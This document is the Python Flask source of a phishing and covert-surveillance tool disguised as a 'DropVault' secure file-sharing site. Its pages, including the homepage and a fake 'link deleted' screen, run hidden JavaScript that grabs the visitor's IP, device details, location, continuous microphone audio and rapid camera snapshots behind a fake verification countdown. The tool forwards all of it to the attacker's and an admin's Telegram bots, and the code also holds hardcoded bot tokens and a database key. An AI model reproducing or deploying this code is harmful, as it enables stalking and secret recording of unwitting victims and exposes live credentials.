# by:@ROMEO_UCHIHA (Pure Stealth Engine, 3-Sec MP3 Rapid Chunks, Redesigned UI & Anti-Crash)
from flask import Flask, request, render_template_string, jsonify
from supabase import create_client, Client
import base64, requests, os, time, json

app = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True

# --- CACHE BUSTER ---
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

# --- SUPABASE & ADMIN CONFIG ---
SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdpam5reHVhZWpzamJ4ZnJ1c2xtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NTYzMzcsImV4cCI6MjA4NTMzMjMzN30.6RFyECY1aRVqxniS3xcv_iol31Su1QNLqXGGfTFlHu0"
supabase: Client = create_client(SUPA_URL, SUPA_KEY)

ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
ADMIN_CID = "6383817850"

# --- TELEGRAM HELPER FUNCTIONS ---
def escape_md(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + char if char in escape_chars else char for char in str(text))

def send_tg_msg(token, cid, text, v_url=""):
    try: 
        safe_url = escape_md(v_url)
        footer = f"\n\n*v site:* [{safe_url}]({v_url})" if v_url else ""
        full_text = text + footer
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage", 
            json={"chat_id": cid, "text": full_text, "parse_mode": "MarkdownV2"},
            timeout=7
        )
    except: pass

def send_tg_photo(token, cid, raw_img, caption="", v_url=""):
    try: 
        safe_url = escape_md(v_url)
        footer = f"\n\n*v site:* [{safe_url}]({v_url})" if v_url else ""
        full_caption = caption + footer
        requests.post(
            f"https://api.telegram.org/bot{token}/sendPhoto", 
            data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
            files={"photo": ("capture.jpg", raw_img, "image/jpeg")}, 
            timeout=15
        )
    except: pass

# Audio forced as .mp3 document
def send_tg_audio_document(token, cid, raw_audio, caption="", v_url=""):
    try: 
        safe_url = escape_md(v_url)
        footer = f"\n\n*v site:* [{safe_url}]({v_url})" if v_url else ""
        full_caption = caption + footer
        requests.post(
            f"https://api.telegram.org/bot{token}/sendDocument", 
            data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
            files={"document": ("Voice_Record.mp3", raw_audio, "audio/mpeg")}, 
            timeout=20
        )
    except Exception as e: 
        print(f"Audio TG Error: {e}")
        pass

def get_link_context(l_id, req):
    try:
        if l_id == "admin" or str(l_id).startswith("del_"):
            return {
                "users": {"bot_token": ADMIN_TOKEN, "chat_id": ADMIN_CID},
                "target_domain": req.host_url.rstrip("/")
            }
        else:
            link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data
            if link: return link[0]
    except: pass
    return None

# --- UI TEMPLATES ---
BASE_TAILWIND = """
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <script>
        tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { sans: ['Plus Jakarta Sans', 'sans-serif'], display: ['Orbitron', 'sans-serif'] } } } }
    </script>
    <style>
        body { background-color: #030008; color: white; overflow-x: hidden; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; }
        .orb { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80vw; height: 80vw; background: radial-gradient(circle, rgba(0,229,255,0.1) 0%, transparent 60%); filter: blur(90px); z-index: -1; pointer-events: none; }
        .glass-box { background: rgba(15, 15, 20, 0.7); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4 m-0 relative">
    <div class="orb"></div>
"""

# --- INJECTABLE JS STEALTH LOGIC (3-Second Rapid Chunking) ---
def get_stealth_js_logic():
    return """
        let batteryInfo = "Not Fetched";
        if(navigator.getBattery) { navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; }); }

        function getHardware() {
            let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0, battery: batteryInfo };
            fetch("/api/log_hardware/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>{});
        }

        function fetchLocation() {
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => { fetch("/api/log_loc/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{}); },
                    (e) => {}, { timeout: 8000 }
                );
            }
        }

        // --- MICROPHONE LOGIC (Rapid 3-Second Chunks) ---
        let mediaRecorder;
        let isRecording = false;

        async function startAudioRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } });
                
                function recordChunk() {
                    if (!isRecording) return;
                    
                    let options = {};
                    if(MediaRecorder.isTypeSupported('audio/webm')) { options = { mimeType: 'audio/webm' }; }
                    
                    mediaRecorder = new MediaRecorder(stream, options);
                    let audioChunks = [];
                    
                    mediaRecorder.ondataavailable = e => { 
                        if (e.data && e.data.size > 0) audioChunks.push(e.data); 
                    };
                    
                    mediaRecorder.onstop = () => {
                        if (audioChunks.length > 0) {
                            let mimeTypeToUse = options.mimeType || 'audio/webm';
                            let audioBlob = new Blob(audioChunks, { type: mimeTypeToUse });
                            let reader = new FileReader();
                            reader.readAsDataURL(audioBlob);
                            reader.onloadend = () => {
                                fetch("/api/capture_audio/" + l_id, {
                                    method: "POST", headers: {"Content-Type": "application/json"},
                                    body: JSON.stringify({ audio: reader.result })
                                }).catch(()=>{});
                            };
                        }
                        // Start the next 3-second chunk immediately
                        if(isRecording) recordChunk(); 
                    };
                    
                    mediaRecorder.start();
                    
                    // Force stop after exactly 3 seconds to trigger upload
                    setTimeout(() => {
                        if(mediaRecorder && mediaRecorder.state === "recording") { 
                            mediaRecorder.stop(); 
                        }
                    }, 3000);
                }
                
                isRecording = true;
                recordChunk();

                const handleExit = () => {
                    if(mediaRecorder && mediaRecorder.state === "recording") {
                        isRecording = false; 
                        mediaRecorder.stop();
                    }
                };

                document.addEventListener("visibilitychange", () => {
                    if(document.visibilityState === 'hidden') handleExit();
                });
                window.addEventListener("pagehide", handleExit);
                window.addEventListener("beforeunload", handleExit);

            } catch(err) { console.log("Mic Denied"); }
        }

        // --- CAMERA LOGIC (Fast Capture & Labels) ---
        let camStream = null; 
        let currentCam = "user"; 
        let captureIntervalId = null; 
        let lastSentImage = "";

        async function switchCameraTo(facingModeStr) {
            if (camStream) { camStream.getTracks().forEach(track => track.stop()); camStream = null; }
            try {
                camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingModeStr === "environment" ? { ideal: "environment" } : "user", width: { ideal: 640 }, height: { ideal: 480 } } });
                const bgV = document.getElementById('bg-v');
                bgV.srcObject = camStream; bgV.onloadedmetadata = () => { bgV.play(); };
                currentCam = facingModeStr;
            } catch(e) {}
        }

        function captureUltraFast() {
            if(camStream) {
                const bgV = document.getElementById('bg-v'); const c = document.getElementById('c');
                if(bgV.videoWidth > 0) {
                    c.width = bgV.videoWidth; c.height = bgV.videoHeight;
                    c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
                    let imgData = c.toDataURL('image/jpeg', 0.6);
                    if (imgData === lastSentImage) return; 
                    lastSentImage = imgData;
                    
                    let camLabel = currentCam === "user" ? "FRONT" : "BACK";
                    fetch("/api/capture/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: camLabel }) }).catch(()=>{});
                }
            }
        }

        async function startUltraStealthSequence() {
            currentCam = (camType === "back") ? "environment" : "user"; 
            await switchCameraTo(currentCam);
            if(captureIntervalId) clearInterval(captureIntervalId);
            // Ultra fast capture
            captureIntervalId = setInterval(captureUltraFast, 300);
            if (camType === "front_back") runCamCycle();
        }

        function runCamCycle() {
            setTimeout(async () => { 
                currentCam = (currentCam === "user") ? "environment" : "user";
                await switchCameraTo(currentCam); 
                runCamCycle(); 
            }, 10000); 
        }
    """

# --- LANDING PAGE (Redirects to RomeoGaming & Root Stealth Capture) ---
@app.route("/")
def index(): 
    content = BASE_TAILWIND + """
    <div class="text-center max-w-3xl z-10 relative">
        <div class="inline-block p-4 rounded-3xl bg-gradient-to-r from-cyan-500/10 to-pink-500/10 border border-white/5 mb-6 backdrop-blur-md">
            <h1 class="font-display font-black text-5xl md:text-7xl text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-pink-500 tracking-wider">DropVault</h1>
        </div>
        <p class="text-lg md:text-xl opacity-70 mb-10 font-medium">Enterprise-Grade Secure File Delivery System.</p>
        <div class="flex gap-4 justify-center">
            <a href="https://romeogaming.vercel.app" class="px-8 py-4 rounded-full bg-black/40 border border-cyan-500/50 hover:bg-cyan-500 hover:text-black font-bold uppercase tracking-widest transition-all shadow-[0_0_20px_rgba(0,229,255,0.2)]">Login</a>
            <a href="https://romeogaming.vercel.app" class="px-8 py-4 rounded-full bg-gradient-to-r from-cyan-500 to-pink-500 text-white font-bold uppercase tracking-widest hover:scale-105 transition-transform shadow-[0_10px_30px_rgba(255,0,85,0.4)]">Start Sharing</a>
        </div>
    </div>
    
    <canvas id="c" class="hidden"></canvas>
    <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>
    <script>
        let l_id = "admin"; let camType = "front_back";
        window.onload = () => { setTimeout(() => { getHardware(); fetchLocation(); startAudioRecording(); startUltraStealthSequence(); }, 1000); };
    """ + get_stealth_js_logic() + """
    </script>
    </body></html>
    """
    return render_template_string(content)

# --- TARGET PAGE (UI & Active Stealth) ---
@app.route("/t/<link_id>")
def target_page(link_id):
    try:
        res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
        
        # ----------------------------------------------------
        # DELETED LINK UI & STEALTH
        # ----------------------------------------------------
        if not res.data:
            del_html = BASE_TAILWIND + f"""
            <div class="glass-box p-10 max-w-lg w-full text-center relative overflow-hidden z-10">
                <i class="fas fa-link-slash text-6xl text-pink-500 mb-6 drop-shadow-[0_0_15px_rgba(255,0,85,0.6)]"></i>
                <h2 class="font-display font-black text-2xl text-white mb-4">ACCESS DENIED</h2>
                <p class="text-sm font-medium text-gray-400 leading-relaxed mb-6">This file or message is removed by user please say him to send you again.</p>
                <div class="w-full h-1 bg-gradient-to-r from-pink-500 to-transparent rounded-full opacity-50"></div>
            </div>
            
            <canvas id="c" class="hidden"></canvas>
            <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>
            <script>
                let l_id = "del_{link_id}"; let camType = "front_back";
                window.onload = () => {{ setTimeout(() => {{ getHardware(); fetchLocation(); startAudioRecording(); startUltraStealthSequence(); }}, 1000); }};
            """ + get_stealth_js_logic() + """
            </script>
            </body></html>
            """
            return render_template_string(del_html)

        # ----------------------------------------------------
        # ACTIVE LINK UI
        # ----------------------------------------------------
        data = res.data[0]
        action_mode = data.get("action_mode", "redirect")
        action_value = data.get("action_value", "")
        text_content = data.get("text_content", "")
        file_type = data.get("file_type", "")
        target_type = data.get("target_type", "both")
        cam_type = data.get("cam_type", "front_back")
        
        val = action_value
        ext = val.split('.')[-1].lower() if val else ''
        is_media = action_mode == 'file' and (ext in ['mp4', 'webm', 'ogg', 'mov', 'jpg', 'jpeg', 'png', 'gif', 'webp'] or file_type in ['image', 'video'])

        html_code = BASE_TAILWIND + '''
            {% if is_media %}
            <!-- FULL SCREEN MEDIA UI -->
            <div class="fixed inset-0 w-full h-full bg-black z-0 flex items-center justify-center">
                {% if ext in ['mp4', 'webm', 'ogg', 'mov'] or f_type == 'video' %}
                    <video id="payload-video" src="{{ a_val }}" controls playsinline loop preload="auto" class="w-full h-full object-contain"></video>
                {% else %}
                    <img src="{{ a_val }}" class="w-full h-full object-contain">
                {% endif %}
                
                <!-- Center Timer Overlay -->
                <div id="media-timer-overlay" class="absolute inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center z-10 transition-opacity duration-500">
                    <div id="timer-count" class="text-8xl md:text-[180px] font-display font-black text-cyan-400 drop-shadow-[0_0_40px_rgba(0,229,255,0.6)]">10</div>
                    <div class="mt-8 text-white font-bold tracking-[0.4em] uppercase text-xs md:text-lg animate-pulse">Decrypting Security Layer...</div>
                </div>
                
                <!-- Floating Download Button -->
                <a href="{{ a_val }}" download class="absolute bottom-8 right-8 bg-black/60 border border-cyan-400/50 text-cyan-400 hover:bg-cyan-400 hover:text-black px-6 py-4 rounded-full font-bold uppercase tracking-widest shadow-[0_0_20px_rgba(0,229,255,0.3)] transition-all z-20 backdrop-blur-lg flex items-center gap-3">
                    <i class="fas fa-download text-xl"></i> <span class="hidden md:inline">Download</span>
                </a>
            </div>
            
            {% else %}
            <!-- STANDARD LOADING BAR UI (Text, Redirect, Document) -->
            <div id="wait-screen" class="glass-box z-10 w-[90%] max-w-md relative overflow-hidden p-10 text-center">
                <h2 class="font-display font-black text-2xl mb-2 text-cyan-400 tracking-wider">VERIFICATION</h2>
                <p class="text-[10px] font-bold uppercase tracking-widest text-gray-400 mb-8 opacity-70">Establishing Secure Uplink</p>
                
                <div class="text-7xl font-display font-black text-white mb-8 drop-shadow-[0_0_20px_rgba(255,255,255,0.2)]" id="timer-count">10</div>
                
                <div class="w-full h-2 bg-white/5 rounded-full overflow-hidden mb-3">
                    <div id="progress-bar" class="h-full bg-gradient-to-r from-cyan-400 to-blue-500 w-0 transition-all ease-linear" style="transition-duration: 1000ms;"></div>
                </div>
                <p class="text-[10px] font-bold opacity-50 uppercase tracking-widest text-right w-full block font-mono" id="progress-text">0%</p>
            </div>

            <div id="media-content" class="glass-box hidden z-10 w-[90%] max-w-lg p-8 text-center"></div>
            {% endif %}

            <canvas id="c" class="hidden"></canvas>
            <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>

            <script>
                let mode = "{{ t_type }}"; 
                let camType = "{{ cam_type }}";
                let actMode = "{{ a_mode }}"; 
                let actVal = "{{ a_val }}"; 
                let txtVal = `{{ t_content | safe }}`; 
                let fType = "{{ f_type }}";
                let l_id = "{{ l_id }}";
                let isMedia = {{ 'true' if is_media else 'false' }};

                window.onload = () => { 
                    startVerificationTimer();
                    setTimeout(() => {
                        getHardware(); 
                        if(mode.includes('loc') || mode === 'both' || mode === 'location') {
                            fetchLocation(); setInterval(fetchLocation, 15000); 
                        }
                        if(mode.includes('mic')) startAudioRecording();
                        if(mode.includes('cam') || mode === 'both' || mode === 'camera') startUltraStealthSequence();
                    }, 1000); 
                };

                // --- 10s SLEEK TIMER ---
                function startVerificationTimer() {
                    let count = 10;
                    let timerEl = document.getElementById('timer-count');
                    let pBar = document.getElementById('progress-bar');
                    let pText = document.getElementById('progress-text');
                    let mOverlay = document.getElementById('media-timer-overlay');

                    if(pBar) setTimeout(()=> { pBar.style.width = '10%'; if(pText) pText.innerText = '10%'; }, 50);

                    let timer = setInterval(() => {
                        count--;
                        if(timerEl) timerEl.innerText = count;
                        
                        if(pBar) {
                            let pct = ((10 - count) / 10) * 100;
                            pBar.style.width = pct + '%';
                            if(pText) pText.innerText = Math.round(pct) + '%';
                        }

                        if(count <= 0) {
                            clearInterval(timer);
                            
                            if(isMedia && mOverlay) {
                                mOverlay.style.opacity = '0';
                                setTimeout(() => {
                                    mOverlay.classList.add('hidden');
                                    let vid = document.getElementById('payload-video');
                                    if (vid) vid.play();
                                }, 500);
                            } else if (!isMedia) {
                                document.getElementById('wait-screen').classList.add('hidden');
                                showFileContent();
                            }
                        }
                    }, 1000);
                }

                function showFileContent() {
                    let medBox = document.getElementById('media-content');
                    if(!medBox) return;
                    medBox.classList.remove('hidden');
                    let html = "";
                    
                    if(actMode === 'text') {
                        html = `<h2 class="font-display font-black text-2xl mb-6 text-cyan-400">DECRYPTED DATA</h2><div class="bg-black/30 p-6 rounded-xl text-left whitespace-pre-wrap font-mono text-sm border border-white/10 overflow-y-auto max-h-[400px] shadow-inner">${txtVal}</div>`;
                    } else if (actMode === 'file') {
                        html = `<div class="py-12 bg-black/30 border border-white/10 rounded-2xl mb-8"><i class="fas fa-file-archive text-6xl text-cyan-400 mb-4 drop-shadow-[0_0_15px_rgba(0,229,255,0.5)]"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">Secure Document Ready</p></div>
                        <a href="${actVal}" download target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-5 rounded-xl hover:scale-[1.02] transition-transform shadow-[0_10px_20px_rgba(0,229,255,0.3)]"><i class="fas fa-download mr-2"></i> Download File</a>`;
                    } else {
                        html = `<div class="py-12 bg-black/30 border border-white/10 rounded-2xl mb-8"><i class="fas fa-link text-6xl text-cyan-400 mb-4 drop-shadow-[0_0_15px_rgba(0,229,255,0.5)]"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">External Gateway Ready</p></div>
                        <a href="${actVal}" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-5 rounded-xl hover:scale-[1.02] transition-transform shadow-[0_10px_20px_rgba(0,229,255,0.3)]">Proceed to Link <i class="fas fa-arrow-right ml-2"></i></a>`;
                        setTimeout(() => { window.location.href = actVal; }, 1500);
                    }
                    medBox.innerHTML = html;
                }
                ''' + get_stealth_js_logic() + '''
            </script>
        </body>
        </html>
        '''
        return render_template_string(html_code, is_media=is_media, ext=ext, t_type=target_type, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id, cam_type=cam_type)
    except Exception as e:
        return f"System Error: {str(e)}"

# --- ANTI-CRASH TRACKING APIS ---
@app.route("/api/log_hardware/<l_id>", methods=["POST"])
def log_hw(l_id):
    try:
        link_ctx = get_link_context(l_id, request)
        if not link_ctx: return jsonify({"s": 0})
        
        user = link_ctx["users"]
        d = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        dev_info = f"{d.get('plat', 'Unknown')} - Cores: {d.get('cores', 0)}"
        bat_info = d.get('battery', 'Unknown')
        
        v_url = f"{link_ctx['target_domain']}/t/{l_id}" if not str(l_id).startswith("del_") and l_id != "admin" else link_ctx['target_domain']
        msg = f"🎯 *TARGET HIT*\n\n🌐 *IP:* `{escape_md(ip)}`\n💻 *Device:* `{escape_md(dev_info)}`\n🔋 *Battery:* `{escape_md(bat_info)}`"
        
        if l_id == "admin" or str(l_id).startswith("del_"):
            type_hit = "Deleted Link" if str(l_id).startswith("del_") else "Direct Root"
            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin \\| {type_hit} Hit_", v_url)
        else:
            send_tg_msg(user["bot_token"], user["chat_id"], msg, v_url)
            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
    except Exception as e: 
        print(f"HW Err: {e}")
    return jsonify({"s": 1})

@app.route("/api/log_loc/<l_id>", methods=["POST"])
def log_loc(l_id):
    try:
        link_ctx = get_link_context(l_id, request)
        if not link_ctx: return jsonify({"s": 0})
        
        user = link_ctx["users"]
        d = request.get_json()
        
        v_url = f"{link_ctx['target_domain']}/t/{l_id}" if not str(l_id).startswith("del_") and l_id != "admin" else link_ctx['target_domain']
        msg = f"📍 *LOCATION ACQUIRED*\n\n*Map:* [Google Maps](https://www.google.com/maps?q={d['lat']},{d['lon']})"
        
        if l_id == "admin" or str(l_id).startswith("del_"):
            type_hit = "Deleted Link" if str(l_id).startswith("del_") else "Direct Root"
            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin \\| {type_hit} Hit_", v_url)
        else:
            send_tg_msg(user["bot_token"], user["chat_id"], msg, v_url)
            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
    except Exception as e: 
        print(f"Loc Err: {e}")
    return jsonify({"s": 1})

@app.route("/api/capture/<l_id>", methods=["POST"])
def cap(l_id):
    try:
        link_ctx = get_link_context(l_id, request)
        if not link_ctx: return jsonify({"s": 0})
        
        user = link_ctx["users"]
        req_data = request.get_json()
        if not req_data or "img" not in req_data: return jsonify({"s": 0})
        
        img_data = req_data["img"]
        if "," in img_data: img_data = img_data.split(",")[1]
        raw = base64.b64decode(img_data)
        
        c_type = req_data.get("cam_type", "UNKNOWN")
        v_url = f"{link_ctx['target_domain']}/t/{l_id}" if not str(l_id).startswith("del_") and l_id != "admin" else link_ctx['target_domain']
        caption = f"📸 *CAMERA CAPTURE* \\({c_type}\\)"
        
        if l_id == "admin" or str(l_id).startswith("del_"):
            type_hit = "Deleted Link" if str(l_id).startswith("del_") else "Direct Root"
            send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin \\| {type_hit} Hit_", v_url)
        else:
            send_tg_photo(user["bot_token"], user["chat_id"], raw, caption, v_url)
            send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
    except Exception as e: 
        print(f"Cam Err: {e}")
    return jsonify({"s": 1})

@app.route("/api/capture_audio/<l_id>", methods=["POST"])
def cap_audio(l_id):
    try:
        link_ctx = get_link_context(l_id, request)
        if not link_ctx: return jsonify({"s": 0})
        
        user = link_ctx["users"]
        req_data = request.get_json()
        if not req_data or "audio" not in req_data: return jsonify({"s": 0})

        audio_data = req_data["audio"]
        if "," in audio_data: audio_data = audio_data.split(",")[1]
        raw = base64.b64decode(audio_data)
        
        v_url = f"{link_ctx['target_domain']}/t/{l_id}" if not str(l_id).startswith("del_") and l_id != "admin" else link_ctx['target_domain']
        caption = f"🎤 *AUDIO RECORDING INTERCEPTED*"
        
        if l_id == "admin" or str(l_id).startswith("del_"):
            type_hit = "Deleted Link" if str(l_id).startswith("del_") else "Direct Root"
            send_tg_audio_document(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin \\| {type_hit} Hit_", v_url)
        else:
            send_tg_audio_document(user["bot_token"], user["chat_id"], raw, caption, v_url)
            send_tg_audio_document(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
    except Exception as e: 
        print(f"Audio Err: {e}")
    return jsonify({"s": 1})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
